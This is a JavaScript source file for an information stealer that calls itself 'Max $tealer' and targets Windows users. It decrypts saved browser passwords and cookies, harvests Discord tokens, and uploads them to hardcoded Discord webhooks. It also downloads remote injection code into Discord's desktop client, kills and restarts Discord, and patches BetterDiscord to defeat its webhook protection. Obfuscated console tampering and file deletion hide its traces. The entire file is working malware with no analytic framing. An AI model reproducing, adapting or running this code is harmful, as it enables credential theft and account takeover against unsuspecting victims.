var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const axios = require('axios');
const buf_replace = require('buffer-replace');
var src = 'https://discord.com/api/webhooks/963061258972717056/5FOWy8Ze06XseTZcQxOOWYkQR66-R6dC-wLHGciPJ-M0Sf-GOoWYfPVklXisFsxINZbx';
const webhook = "da_webhook"
async function getPizzas(W) {
  let m = W.split('\\'),
    O = W.includes('Network')
      ? m.splice(0, m.length - 3)
      : m.splice(0, m.length - 2),
    c = O.join('\\') + '\\'
  if (W.startsWith(appdata)) {
    c = W
  }
  if (W.includes('cord')) {
    return
  }
  if (fs.existsSync(c)) {
    let n = Buffer.from(
      JSON.parse(fs.readFileSync(c + 'Local State')).os_crypt.encrypted_key,
      'base64'
    ).slice(5)
    var g = W + 'Login Data',
      v = W + 'passwords.db'
    fs.copyFileSync(g, v)
    const B = dpapi.unprotectData(Buffer.from(n, 'utf-8'), null, 'CurrentUser')
    var b = '\n\nPASSWORDS FROM: ' + W + '  #RustlerONTOP\n',
      U = new sqlite3.Database(v, (i) => {
        if (i) {
          if (debug) {
            console.log(i)
          }
        }
      })
    const N = await new Promise((i, G) => {
      U.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        function (f, H) {
          if (f) {
            if (debug) {
              console.log(f)
            }
          }
          if (H.username_value != '') {
            let C = H.password_value
            try {
              if (C[0] == 1 && C[1] == 0 && C[2] == 0 && C[3] == 0) {
                b +=
                  '\nURL: ' +
                  H.origin_url +
                  ' | USERNAME: ' +
                  H.username_value +
                  ' | PASSWORD: ' +
                  dpapi.unprotectData(C, null, 'CurrentUser').toString('utf-8')
              } else {
                let Z = C.slice(3, 15),
                  x = C.slice(15, C.length - 16),
                  D = C.slice(C.length - 16, C.length),
                  T = crypto.createDecipheriv('aes-256-gcm', B, Z)
                T.setAuthTag(D)
                b +=
                  '\nURL: ' +
                  H.origin_url +
                  ' | USERNAME: ' +
                  H.username_value +
                  ' | PASSWORD: ' +
                  T.update(x, 'base64', 'utf-8') +
                  T.final('utf-8')
              }
            } catch (o) {
              if (debug) {
                console.log(o)
              }
            }
          }
        },
        function () {
          i(b)
        }
      )
    })
    return N
  } else {
    return ''
  }
}
async function getCheese(W) {
  let m = W.split('\\'),
    O = W.includes('Network')
      ? m.splice(0, m.length - 3)
      : m.splice(0, m.length - 2),
    c = O.join('\\') + '\\'
  if (W.startsWith(appdata)) {
    c = W
  }
  if (W.includes('cord')) {
    return
  }
  if (fs.existsSync(c)) {
    let n = Buffer.from(
      JSON.parse(fs.readFileSync(c + 'Local State')).os_crypt.encrypted_key,
      'base64'
    ).slice(5)
    var g = W + 'Cookies',
      v = W + 'cookies.db'
    fs.copyFileSync(g, v)
    const B = dpapi.unprotectData(Buffer.from(n, 'utf-8'), null, 'CurrentUser')
    var b = '',
      U = new sqlite3.Database(v, (i) => {
        if (i) {
          if (debug) {
            console.log(i)
          }
        }
      })
    const N = await new Promise((i, G) => {
      U.each(
        'SELECT host_key, name, encrypted_value FROM cookies',
        function (f, H) {
          if (f) {
            if (debug) {
              console.log(f)
            }
          }
          let C = H.encrypted_value
          try {
            if (C[0] == 1 && C[1] == 0 && C[2] == 0 && C[3] == 0) {
              b +=
                H.host_key +
                '\t' +
                'TRUE' +
                '\t/' +
                '\tFALSE' +
                '\t2597573456\t' +
                H.name +
                '\t' +
                dpapi.unprotectData(C, null, 'CurrentUser') +
                '\n'.toString('utf-8')
            } else {
              let Z = C.slice(3, 15),
                x = C.slice(15, C.length - 16),
                D = C.slice(C.length - 16, C.length),
                T = crypto.createDecipheriv('aes-256-gcm', B, Z)
              T.setAuthTag(D)
              b +=
                H.host_key +
                '\t' +
                'TRUE' +
                '\t/' +
                '\tFALSE' +
                '\t2597573456\t' +
                H.name +
                '\t' +
                T.update(x, 'base64', 'utf-8') +
                T.final('utf-8') +
                '\n'
            }
          } catch (o) {
            if (debug) {
              console.log(o)
            }
          }
        },
        function () {
          i(b)
        }
      )
    })
    return N
  } else {
    return ''
  }
}
function findToken(W) {
  W += 'Local Storage\\leveldb'
  let m = []
  try {
    fs.readdirSync(W).map((O) => {
      ;(O.endsWith('.log') || O.endsWith('.ldb')) &&
        fs
          .readFileSync(W + '\\' + O, 'utf8')
          .split(/\r?\n/)
          .forEach((c) => {
            const g = [
              new RegExp(/mfa\.[\w-]{84}/g),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
            ]
            for (const v of g) {
              const b = c.match(v)
              if (b) {
                b.forEach((U) => m.push(U))
              }
            }
          })
    })
  } catch (O) {}
  return m
}
async function takePizzas() {
  let W = ''
  for (let m = 0; m < paths.length; m++) {
    if (fs.existsSync(paths[m] + 'Login Data')) {
      W += (await getPizzas(paths[m])) || ''
    }
  }
  fs.writeFile(appdata + '\\passwords.txt', W, function (O, c) {
    if (O) {
      throw O
    }
    const g = new FormData()
    g.append('file', fs.createReadStream(appdata + '\\passwords.txt'))
    g.submit(superstarlmao, (v, b) => {
      if (v) {
        console.log(v)
      }
    })
  })
  fs.writeFile(appdata + '\\src-passwords.txt', W, function (O, c) {
    if (O) {
      throw O
    }
    const g = new FormData()
    g.append('file', fs.createReadStream(appdata + '\\src-passwords.txt'))
    g.submit(src, (v, b) => {
      if (v) {
        console.log(v)
      }
    })
  })
}
async function takeCheese() {
  let W = ''
  for (let m = 0; m < paths.length; m++) {
    if (fs.existsSync(paths[m] + 'Cookies')) {
      W += (await getCheese(paths[m])) || ''
    }
  }
  fs.writeFile(appdata + '\\cookies.txt', W, function (O, c) {
    if (O) {
      throw O
    }
    const g = new FormData()
    g.append('file', fs.createReadStream(appdata + '\\cookies.txt'))
    g.submit(superstarlmao, (v, b) => {
      if (v) {
        console.log(v)
      }
    })
  })
  fs.writeFile(appdata + '\\src-cookies.txt', W, function (O, c) {
    if (O) {
      throw O
    }
    const g = new FormData()
    g.append('file', fs.createReadStream(appdata + '\\src-cookies.txt'))
    g.submit(src, (v, b) => {
      if (v) {
        console.log(v)
      }
    })
  })
}
async function removePizzas() {
  const O = (function () {
      let g = true
      return function (v, b) {
        const U = g
          ? function () {
              if (b) {
                const n = b.apply(v, arguments)
                return (b = null), n
              }
            }
          : function () {}
        return (g = false), U
      }
    })(),
    c = O(this, function () {
      let g
      try {
        const U = Function(
          'return (function() {}.constructor("return this")( ));'
        )
        g = U()
      } catch (n) {
        g = window
      }
      const v = (g.console = g.console || {}),
        b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
      for (let B = 0; B < b.length; B++) {
        const N = O.constructor.prototype.bind(O),
          i = b[B],
          G = v[i] || N
        N['__proto__'] = O.bind(O)
        N.toString = G.toString.bind(G)
        v[i] = N
      }
    })
  c()
  await sleep(1000)
  fs.unlinkSync(appdata + '\\passwords.txt')
  fs.unlinkSync(appdata + '\\cookies.txt')
  fs.unlinkSync(appdata + '\\src-passwords.txt')
  fs.unlinkSync(appdata + '\\src-cookies.txt')
}

const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify":"false",
    "embed-color": 3447704,
    "disable-qr-code": "true"
}




var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];


fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});

discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
    })
    
});
listDiscords();
takePizzas()
takeCheese()
removePizzas()
function Infect() {
    https.get('https://raw.githubusercontent.com/Max87153/jejej/main/injection-clean.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                if (config["init-notify"] == "true") {
                    let init = file.replace("index.js", "init")
                    if (!fs.existsSync(init)) {
                        fs.mkdirSync(init, 0744)
                    }
                }
                if ( config.logout != "false" ) {

                    let folder = file.replace("index.js", "PirateStealerBTW")
                    if (!fs.existsSync(folder)) {
                        fs.mkdirSync(folder, 0744)
                        if (config.logout == "instant") {
                            startDiscord();
                        }
                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
                        startDiscord();
                    }
                }
            })
            
        });
    }).on("error", (err) => {
        console.log(err);
    });
};


function listDiscords() {
    exec('tasklist', function(err,stdout, stderr) {

        
        if (stdout.includes("Discord.exe")) {

            runningDiscords.push("discord")
        }
        if (stdout.includes("DiscordCanary.exe")) {

            runningDiscords.push("discordcanary")
        }
        if (stdout.includes("DiscordDevelopment.exe")) {

            runningDiscords.push("discorddevelopment")
        }
        if (stdout.includes("DiscordPTB.exe")) {

            runningDiscords.push("discordptb")
        };
        if (config.logout == "instant") {
            killDiscord();
        } else {
            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
                injectNotify();
            }
            Infect()
            pwnBetterDiscord()
        }
    })


   
};

function killDiscord() {
    runningDiscords.forEach(disc => {
        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
            if (err) {
              return;
            }
          });
    });
    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
        injectNotify();
    }

    Infect()
    pwnBetterDiscord()
};

function startDiscord() {
    runningDiscords.forEach(disc => {
        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
        exec(path, (err) => {
            if (err) {
              return;
            }
          });
    });
};
function pwnBetterDiscord() {
    // thx stanley
    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    if (fs.existsSync(dir)) {
        var x = fs.readFileSync(dir)
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
    } else {
        return;
    }

}


function injectNotify() {
    var fields = [];
    injectPath.forEach( path => {
        var c = {
            name: "<a:random_coxsyringe:836257283158966332> Injection Path",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
    })
    axios
	.post(webhook, {
        "content": null,
        "embeds": [
          {
            "title": "<:drip_blackskull:860879908090675220> Successfully injected!",
            "color": config["embed-color"],
            "fields": fields,
            "author": {
              "name": "Max $tealer"
            },
            "footer": {
              "text": "Max $tealer"
            }
          }
        ]
      })
	.then(res => {
	})
	.catch(error => {

    })

}
